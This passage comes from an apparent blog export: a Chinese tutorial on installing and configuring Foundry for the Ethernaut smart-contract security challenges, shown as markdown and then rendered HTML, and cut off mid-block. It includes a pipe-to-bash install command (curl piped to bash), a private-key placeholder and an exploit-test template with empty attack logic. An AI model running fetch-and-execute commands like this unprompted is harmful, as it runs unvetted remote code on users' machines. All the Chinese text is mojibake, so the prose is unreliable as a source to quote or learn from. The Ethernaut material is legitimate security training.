ä¾èµ–ç®¡ç†\nforge install <dependency>     # å®‰è£…ä¾èµ–\nforge remove <dependency>     # ç§»é™¤ä¾èµ–\nforge update                  # æ›´æ–°ä¾èµ–\n\n# ä»£ç æ ¼å¼åŒ–\nforge fmt                     # æ ¼å¼åŒ– Solidity ä»£ç \n```\n\n### Cast å‘½ä»¤\n\n```bash\n# æŸ¥è¯¢åŒºå—é“¾ä¿¡æ¯\ncast block-number             # è·å–æœ€æ–°åŒºå—å·\ncast balance <address>        # æŸ¥è¯¢åœ°å€ä½™é¢\ncast storage <address> <slot> # è¯»å–å­˜å‚¨æ§½\n\n# è°ƒç”¨åˆçº¦\ncast call <address> <signature> [args]  # åªè¯»è°ƒç”¨\ncast send <address> <signature> [args]  # çŠ¶æ€å˜æ›´è°ƒç”¨\n\n# å·¥å…·å‡½æ•°\ncast keccak \"function_signature()\"      # è®¡ç®—å‡½æ•°é€‰æ‹©å™¨\ncast abi-encode \"func(uint256)\" 123     # ABI ç¼–ç \n```\n\n### Anvil å‘½ä»¤\n\n```bash\n# å¯åŠ¨æœ¬åœ°æµ‹è¯•ç½‘\nanvil                         # é»˜è®¤é…ç½®\nanvil --port 8545            # æŒ‡å®šç«¯å£\nanvil --accounts 20          # æŒ‡å®šè´¦æˆ·æ•°é‡\nanvil --balance 1000         # æ¯ä¸ªè´¦æˆ·åˆå§‹ä½™é¢ (ETH)\n\n# ä»ç‰¹å®šçŠ¶æ€åˆ†å‰\nanvil --fork-url https://rpc.ankr.com/eth\nanvil --fork-url https://rpc.ankr.com/eth --fork-block-number 19000000\n```\n\n## ğŸ¯ Ethernaut ä¸“ç”¨é…ç½®\n\n### ç¯å¢ƒå˜é‡é…ç½®\n\nåˆ›å»º `.env` æ–‡ä»¶ï¼š\n\n```bash\n# .env æ–‡ä»¶\nETHERSCAN_API_KEY=your_etherscan_api_key\nMAINNET_RPC_URL=https://rpc.ankr.com/eth\nSEPOLIA_RPC_URL=https://rpc.ankr.com/eth_sepolia\nPRIVATE_KEY=your_private_key_for_testing\n```\n\nåŠ è½½ç¯å¢ƒå˜é‡ï¼š\n\n```bash\n# åœ¨ shell ä¸­åŠ è½½\nsource .env\n\n# æˆ–åœ¨ foundry.toml ä¸­é…ç½®è‡ªåŠ¨åŠ è½½\n[profile.default]\nenv_file = \".env\"\n```\n\n### æµ‹è¯•æ¨¡æ¿\n\nåˆ›å»ºæ ‡å‡†æµ‹è¯•æ–‡ä»¶æ¨¡æ¿ï¼š\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/TargetContract.sol\";\n\ncontract TargetContractTest is Test {\n    TargetContract public instance;\n    address public attacker = makeAddr(\"attacker\");\n    \n    function setUp() public {\n        // éƒ¨ç½²ç›®æ ‡åˆçº¦\n        instance = new TargetContract();\n        \n        // åˆå§‹åŒ–æ”»å‡»è€…è´¦æˆ·\n        vm.deal(attacker, 10 ether);\n    }\n    \n    function testExploit() public {\n        vm.startPrank(attacker);\n        \n        // æ”»å‡»é€»è¾‘\n        \n        vm.stopPrank();\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertTrue(/* éªŒè¯æ¡ä»¶ */);\n    }\n}\n```\n\n## ğŸ› å¸¸è§é—®é¢˜è§£å†³\n\n### ç¼–è¯‘é”™è¯¯\n\n```bash\n# æ¸…ç†å¹¶é‡æ–°ç¼–è¯‘\nforge clean && forge build\n\n# æ£€æŸ¥ Solidity ç‰ˆæœ¬å…¼å®¹æ€§\nforge build --force\n\n# æŸ¥çœ‹è¯¦ç»†é”™è¯¯ä¿¡æ¯\nforge build --verbose\n```\n\n### ä¾èµ–é—®é¢˜\n\n```bash\n# é‡æ–°å®‰è£…ä¾èµ–\nrm -rf lib/\nforge install\n\n# æ£€æŸ¥ Git å­æ¨¡å—çŠ¶æ€\ngit submodule status\ngit submodule update --init --recursive\n```\n\n### æµ‹è¯•å¤±è´¥\n\n```bash\n# å¢åŠ è¯¦ç»†è¾“å‡º\nforge test -vvvv\n\n# ä½¿ç”¨è°ƒè¯•å™¨\nforge test --debug <test_function>\n\n# æ£€æŸ¥ gas ä½¿ç”¨æƒ…å†µ\nforge test --gas-report\n```\n\n## ğŸ“š è¿›é˜¶é…ç½®\n\n### å¤šç‰ˆæœ¬ Solidity æ”¯æŒ\n\n```toml\n# foundry.toml\n[profile.default]\nsolc = \"0.8.19\"\n\n[profile.legacy]\nsolc = \"0.6.12\"\n```\n\n### è‡ªå®šä¹‰æµ‹è¯•é…ç½®\n\n```toml\n[profile.default.fuzz]\nruns = 1000\nmax_test_rejects = 65536\n\n[profile.default.invariant]\nruns = 256\ndepth = 32\n```\n\n### Gas ä¼˜åŒ–è®¾ç½®\n\n```toml\n[profile.default.optimizer]\nenabled = true\nruns = 200\n\n[profile.default.model_checker]\ncontracts = { \"/path/to/project/src/Contract.sol\" = [ \"Contract\" ] }\nengine = \"chc\"\ntargets = [ \"assert\", \"underflow\", \"overflow\", \"divByZero\" ]\n```\n\n## ğŸ“ æ€»ç»“\n\nç°åœ¨æ‚¨å·²ç»å®Œæˆäº† Foundry å¼€å‘ç¯å¢ƒçš„æ­å»ºï¼Œå¯ä»¥å¼€å§‹ Ethernaut å®‰å…¨æŒ‘æˆ˜çš„å­¦ä¹ ä¹‹æ—…äº†ï¼\n\n### ä¸‹ä¸€æ­¥ï¼š\n\n1. **ç†Ÿæ‚‰ Foundry åŸºæœ¬å‘½ä»¤**\n2. **è¿è¡Œç¬¬ä¸€ä¸ªæµ‹è¯•**: `forge test --match-contract FallbackTest -vvv`\n3. **å¼€å§‹å­¦ä¹ **: [Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[Foundry å®˜æ–¹æ–‡æ¡£](https://book.getfoundry.sh/)**\n- **[Foundry GitHub](https://github.com/foundry-rs/foundry)**\n- **[ä¸‹ä¸€ç¯‡: Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n\n---\n\n*å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚æŒæ¡å¥½å·¥å…·ï¼Œæ‰èƒ½æ›´å¥½åœ°å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨ã€‚* ğŸ”§","slug":"foundry-setup-guide","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpo0021bf5qfluybngv","content":"<h1 id=\"ğŸ› ï¸-Foundry-ç¯å¢ƒæ­å»ºä¸-Ethernaut-é¡¹ç›®é…ç½®\"><a href=\"#ğŸ› ï¸-Foundry-ç¯å¢ƒæ­å»ºä¸-Ethernaut-é¡¹ç›®é…ç½®\" class=\"headerlink\" title=\"ğŸ› ï¸ Foundry ç¯å¢ƒæ­å»ºä¸ Ethernaut é¡¹ç›®é…ç½®\"></a>ğŸ› ï¸ Foundry ç¯å¢ƒæ­å»ºä¸ Ethernaut é¡¹ç›®é…ç½®</h1><blockquote>\n<p>åœ¨å¼€å§‹ Ethernaut å®‰å…¨æŒ‘æˆ˜ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ­å»ºä¸€ä¸ªå®Œæ•´çš„ Foundry å¼€å‘ç¯å¢ƒã€‚æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»ä»é›¶å¼€å§‹çš„å®Œæ•´é…ç½®æµç¨‹ã€‚</p>\n</blockquote>\n<h2 id=\"ğŸ“š-ä»€ä¹ˆæ˜¯-Foundry\"><a href=\"#ğŸ“š-ä»€ä¹ˆæ˜¯-Foundry\" class=\"headerlink\" title=\"ğŸ“š ä»€ä¹ˆæ˜¯ Foundry?\"></a>ğŸ“š ä»€ä¹ˆæ˜¯ Foundry?</h2><p><strong>Foundry</strong> æ˜¯ä¸€ä¸ªç”¨ Rust ç¼–å†™çš„å¿«é€Ÿã€å¯ç§»æ¤å’Œæ¨¡å—åŒ–çš„ä»¥å¤ªåŠå¼€å‘å·¥å…·åŒ…ï¼ŒåŒ…å«ï¼š</p>\n<ul>\n<li><strong>Forge</strong>: æµ‹è¯•æ¡†æ¶</li>\n<li><strong>Cast</strong>: ç‘å£«å†›åˆ€èˆ¬çš„ RPC å·¥å…·</li>\n<li><strong>Anvil</strong>: æœ¬åœ°æµ‹è¯•ç½‘ç»œ</li>\n<li><strong>Chisel</strong>: Solidity REPL</li>\n</ul>\n<h3 id=\"ä¸å…¶ä»–å·¥å…·å¯¹æ¯”\"><a href=\"#ä¸å…¶ä»–å·¥å…·å¯¹æ¯”\" class=\"headerlink\" title=\"ä¸å…¶ä»–å·¥å…·å¯¹æ¯”\"></a>ä¸å…¶ä»–å·¥å…·å¯¹æ¯”</h3><table>\n<thead>\n<tr>\n<th>å·¥å…·</th>\n<th>è¯­è¨€</th>\n<th>æµ‹è¯•é€Ÿåº¦</th>\n<th>é…ç½®å¤æ‚åº¦</th>\n<th>ç¤¾åŒºæ”¯æŒ</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Foundry</strong></td>\n<td>Rust</td>\n<td>â­â­â­â­â­</td>\n<td>â­â­â˜†â˜†â˜†</td>\n<td>â­â­â­â­â˜†</td>\n</tr>\n<tr>\n<td>Hardhat</td>\n<td>JavaScript</td>\n<td>â­â­â­â˜†â˜†</td>\n<td>â­â­â­â˜†â˜†</td>\n<td>â­â­â­â­â­</td>\n</tr>\n<tr>\n<td>Truffle</td>\n<td>JavaScript</td>\n<td>â­â­â˜†â˜†â˜†</td>\n<td>â­â­â­â­â˜†</td>\n<td>â­â­â­â˜†â˜†</td>\n</tr>\n</tbody></table>\n<h2 id=\"ğŸš€-Foundry-å®‰è£…\"><a href=\"#ğŸš€-Foundry-å®‰è£…\" class=\"headerlink\" title=\"ğŸš€ Foundry å®‰è£…\"></a>ğŸš€ Foundry å®‰è£…</h2><h3 id=\"æ–¹æ³•ä¸€ï¼šä½¿ç”¨-Foundryup-æ¨è\"><a href=\"#æ–¹æ³•ä¸€ï¼šä½¿ç”¨-Foundryup-æ¨è\" class=\"headerlink\" title=\"æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Foundryup (æ¨è)\"></a>æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Foundryup (æ¨è)</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä¸‹è½½å¹¶å®‰è£… Foundryup</span></span><br><span class=\"line\">curl -L https://foundry.paradigm.xyz | bash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># é‡æ–°åŠ è½½ shell æˆ–é‡å¯ç»ˆç«¯</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc  <span class=\"comment\"># æˆ– source ~/.zshrc</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ Foundry</span></span><br><span class=\"line\">foundryup</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># éªŒè¯å®‰è£…</span></span><br><span class=\"line\">forge --version</span><br><span class=\"line\">cast --version</span><br><span class=\"line\">anvil --version</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ–¹æ³•äºŒï¼šä»æºç ç¼–è¯‘\"><a href=\"#æ–¹æ³•äºŒï¼šä»æºç ç¼–è¯‘\" class=\"headerlink\" title=\"æ–¹æ³•äºŒï¼šä»æºç ç¼–è¯‘\"></a>æ–¹æ³•äºŒï¼šä»æºç ç¼–è¯‘</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å…‹éš† Foundry ä»“åº“</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/foundry-rs/foundry</span><br><span class=\"line\"><span class=\"built_in\">cd</span> foundry</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ç¼–è¯‘å®‰è£… (éœ€è¦ Rust ç¯å¢ƒ)</span></span><br><span class=\"line\">cargo build --release</span><br><span class=\"line\">cargo install --path ./crates/forge --bin forge</span><br><span class=\"line\">cargo install --path ./crates/cast --bin cast</span><br><span class=\"line\">cargo install --path ./crates/anvil --bin anvil</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åŒ…ç®¡ç†å™¨\"><a href=\"#æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åŒ…ç®¡ç†å™¨\" class=\"headerlink\" title=\"æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åŒ…ç®¡ç†å™¨\"></a>æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åŒ…ç®¡ç†å™¨</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># macOS (Homebrew)</span></span><br><span class=\"line\">brew install foundry</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Ubuntu/Debian (éœ€è¦æ·»åŠ  PPA)</span></span><br><span class=\"line\"><span class=\"comment\"># æš‚ä¸æ”¯æŒï¼Œå»ºè®®ä½¿ç”¨æ–¹æ³•ä¸€</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Windows (éœ€è¦ WSL)</span></span><br><span class=\"line\"><span class=\"comment\"># åœ¨ WSL ä¸­æ‰§è¡Œæ–¹æ³•ä¸€çš„æ­¥éª¤</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“-Ethernaut-é¡¹ç›®ç»“æ„\"><a href=\"#ğŸ“-Ethernaut-é¡¹ç›®ç»“æ„\" class=\"headerlink\" title=\"ğŸ“ Ethernaut é¡¹ç›®ç»“æ„\"></a>ğŸ“ Ethernaut é¡¹ç›®ç»“æ„</h2><h3 id=\"å…‹éš†é¡¹ç›®\"><a href=\"#å…‹éš†é¡¹ç›®\" class=\"headerlink\" title=\"å…‹éš†é¡¹ç›®\"></a>å…‹éš†é¡¹ç›®</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å…‹éš† Ethernaut Foundry Solutions é¡¹ç›®</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Ethernaut-Foundry-Solutions</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æŸ¥çœ‹é¡¹ç›®ç»“æ„</span></span><br><span class=\"line\">tree -L 2</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"é¡¹ç›®ç›®å½•ç»“æ„\"><a href=\"#é¡¹ç›®ç›®å½•ç»“æ„\" class=\"headerlink\" title=\"é¡¹ç›®ç›®å½•ç»“æ„\"></a>é¡¹ç›®ç›®å½•ç»“æ„</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Ethernaut-Foundry-Solutions/</span><br><span class=\"line\">â”œâ”€â”€ foundry.toml          # Foundry é…ç½®æ–‡ä»¶</span><br><span class=\"line\">â”œâ”€â”€ .gitmodules          # Git å­æ¨¡å—é…ç½®</span><br><span class=\"line\">â”œâ”€â”€ README.md            # é¡¹ç›®è¯´æ˜</span><br><span class=\"line\">â”œâ”€â”€ lib/                 # ä¾èµ–åº“</span><br><span class=\"line\">â”‚   â”œâ”€â”€ forge-std/       # Foundry æ ‡å‡†åº“</span><br><span class=\"line\">â”‚   â””â”€â”€ openzeppelin-contracts/  # OpenZeppelin åˆçº¦åº“</span><br><span class=\"line\">â”œâ”€â”€ src/                 # æºç ç›®å½•</span><br><span class=\"line\">â”‚   â”œâ”€â”€ Fallback.sol     # å…³å¡åŸå§‹åˆçº¦</span><br><span class=\"line\">â”‚   â”œâ”€â”€ Fallout.sol</span><br><span class=\"line\">â”‚   â””â”€â”€ ...</span><br><span class=\"line\">â”œâ”€â”€ test/                # æµ‹è¯•ç›®å½•</span><br><span class=\"line\">â”‚   â”œâ”€â”€ FallbackTest.sol # æ”»å‡»æµ‹è¯•åˆçº¦</span><br><span class=\"line\">â”‚   â”œâ”€â”€ FalloutTest.sol</span><br><span class=\"line\">â”‚   â””â”€â”€ ...</span><br><span class=\"line\">â”œâ”€â”€ script/              # éƒ¨ç½²è„šæœ¬</span><br><span class=\"line\">â””â”€â”€ solutions/           # è§£é¢˜è¯´æ˜æ–‡æ¡£</span><br><span class=\"line\">    â”œâ”€â”€ 01_Fallback_zh.md</span><br><span class=\"line\">    â””â”€â”€ ...</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"âš™ï¸-é¡¹ç›®é…ç½®\"><a href=\"#âš™ï¸-é¡¹ç›®é…ç½®\" class=\"headerlink\" title=\"âš™ï¸ é¡¹ç›®é…ç½®\"></a>âš™ï¸ é¡¹ç›®é…ç½®</h2><h3 id=\"Foundry-é…ç½®æ–‡ä»¶\"><a href=\"#Foundry-é…ç½®æ–‡ä»¶\" class=\"headerlink\" title=\"Foundry é…ç½®æ–‡ä»¶\"></a>Foundry é…ç½®æ–‡ä»¶</h3><p>æŸ¥çœ‹ <code>foundry.toml</code> é…ç½®ï¼š</p>\n<figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default]</span></span><br><span class=\"line\"><span class=\"attr\">src</span> = <span class=\"string\">&quot;src&quot;</span></span><br><span class=\"line\"><span class=\"attr\">out</span> = <span class=\"string\">&quot;out&quot;</span></span><br><span class=\"line\"><span class=\"attr\">libs</span> = [<span class=\"string\">&quot;lib&quot;</span>]</span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.8.19&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Etherscan API é…ç½® (å¯é€‰)</span></span><br><span class=\"line\"><span class=\"section\">[etherscan]</span></span><br><span class=\"line\"><span class=\"attr\">mainnet</span> = &#123; key = <span class=\"string\">&quot;$&#123;API_KEY_ETHERSCAN&#125;&quot;</span> &#125;</span><br><span class=\"line\"><span class=\"attr\">sepolia</span> = &#123; key = <span class=\"string\">&quot;$&#123;API_KEY_ETHERSCAN&#125;&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RPC ç«¯ç‚¹é…ç½®</span></span><br><span class=\"line\"><span class=\"section\">[rpc_endpoints]</span></span><br><span class=\"line\"><span class=\"attr\">mainnet</span> = <span class=\"string\">&quot;https://rpc.ankr.com/eth&quot;</span></span><br><span class=\"line\"><span class=\"attr\">sepolia</span> = <span class=\"string\">&quot;https://rpc.ankr.com/eth_sepolia&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å®‰è£…ä¾èµ–\"><a href=\"#å®‰è£…ä¾èµ–\" class=\"headerlink\" title=\"å®‰è£…ä¾èµ–\"></a>å®‰è£…ä¾èµ–</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å®‰è£…é¡¹ç›®ä¾èµ–</span></span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ‰‹åŠ¨å®‰è£…ç‰¹å®šä¾èµ– (å¦‚æœéœ€è¦)</span></span><br><span class=\"line\">forge install openzeppelin/openzeppelin-contracts</span><br><span class=\"line\">forge install foundry-rs/forge-std</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ›´æ–°ä¾èµ–åˆ°æœ€æ–°ç‰ˆæœ¬</span></span><br><span class=\"line\">forge update</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ§ª-åŸºæœ¬ä½¿ç”¨\"><a href=\"#ğŸ§ª-åŸºæœ¬ä½¿ç”¨\" class=\"headerlink\" title=\"ğŸ§ª åŸºæœ¬ä½¿ç”¨\"></a>ğŸ§ª åŸºæœ¬ä½¿ç”¨</h2><h3 id=\"ç¼–è¯‘åˆçº¦\"><a href=\"#ç¼–è¯‘åˆçº¦\" class=\"headerlink\" title=\"ç¼–è¯‘åˆçº¦\"></a>ç¼–è¯‘åˆçº¦</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ç¼–è¯‘æ‰€æœ‰åˆçº¦</span></span><br><span class=\"line\">forge build</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ç¼–è¯‘ç‰¹å®šåˆçº¦</span></span><br><span class=\"line\">forge build src/Fallback.sol</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æŸ¥çœ‹ç¼–è¯‘è¾“å‡º</span></span><br><span class=\"line\"><span class=\"built_in\">ls</span> out/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œæ‰€æœ‰æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¿è¡Œç‰¹å®šæµ‹è¯•åˆçº¦</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¯¦ç»†è¾“å‡º (å¤šä¸ª v å¢åŠ è¯¦ç»†ç¨‹åº¦)</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¿è¡Œç‰¹å®šæµ‹è¯•å‡½æ•°</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-test testFallbackExploit -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ˜¾ç¤º gas æŠ¥å‘Š</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ä½¿ç”¨-Anvil-æœ¬åœ°æµ‹è¯•ç½‘\"><a href=\"#ä½¿ç”¨-Anvil-æœ¬åœ°æµ‹è¯•ç½‘\" class=\"headerlink\" title=\"ä½¿ç”¨ Anvil æœ¬åœ°æµ‹è¯•ç½‘\"></a>ä½¿ç”¨ Anvil æœ¬åœ°æµ‹è¯•ç½‘</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å¯åŠ¨æœ¬åœ°æµ‹è¯•ç½‘ (æ–°ç»ˆç«¯)</span></span><br><span class=\"line\">anvil</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­ï¼Œé’ˆå¯¹æœ¬åœ°ç½‘ç»œè¿è¡Œæµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --fork-url http://localhost:8545</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”§-å¸¸ç”¨-Foundry-å‘½ä»¤\"><a href=\"#ğŸ”§-å¸¸ç”¨-Foundry-å‘½ä»¤\" class=\"headerlink\" title=\"ğŸ”§ å¸¸ç”¨ Foundry å‘½ä»¤\"></a>ğŸ”§ å¸¸ç”¨ Foundry å‘½ä»¤</h2><h3 id=\"Forge-å‘½ä»¤\"><a href=\"#Forge-å‘½ä»¤\" class=\"headerlink\" title=\"Forge å‘½ä»¤\"></a>Forge å‘½ä»¤</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># é¡¹ç›®ç®¡ç†</span></span><br><span class=\"line\">forge init my-project          <span class=\"comment\"># åˆå§‹åŒ–æ–°é¡¹ç›®</span></span><br><span class=\"line\">forge build                    <span class=\"comment\"># ç¼–è¯‘åˆçº¦</span></span><br><span class=\"line\">forge clean                    <span class=\"comment\"># æ¸…ç†ç¼–è¯‘è¾“å‡º</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æµ‹è¯•ç›¸å…³</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span>                     <span class=\"comment\"># è¿è¡Œæµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --watch            <span class=\"comment\"># ç›‘è§†æ–‡ä»¶å˜åŒ–å¹¶è‡ªåŠ¨æµ‹è¯•</span></span><br><span class=\"line\">forge coverage                <span class=\"comment\"># ä»£ç è¦†ç›–ç‡æŠ¥å‘Š</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä¾èµ–ç®¡ç†</span></span><br><span class=\"line\">forge install &lt;dependency&gt;     <span class=\"comment\"># å®‰è£…ä¾èµ–</span></span><br><span class=\"line\">forge remove &lt;dependency&gt;     <span class=\"comment\"># ç§»é™¤ä¾èµ–</span></span><br><span class=\"line\">forge update                  <span class=\"comment\"># æ›´æ–°ä¾èµ–</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä»£ç æ ¼å¼åŒ–</span></span><br><span class=\"line\">forge <span class=\"built_in\">fmt</span>                     <span class=\"comment\"># æ ¼å¼åŒ– Solidity ä»£ç </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Cast-å‘½ä»¤\"><a href=\"#Cast-å‘½ä»¤\" class=\"headerlink\" title=\"Cast å‘½ä»¤\"></a>Cast å‘½ä»¤</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 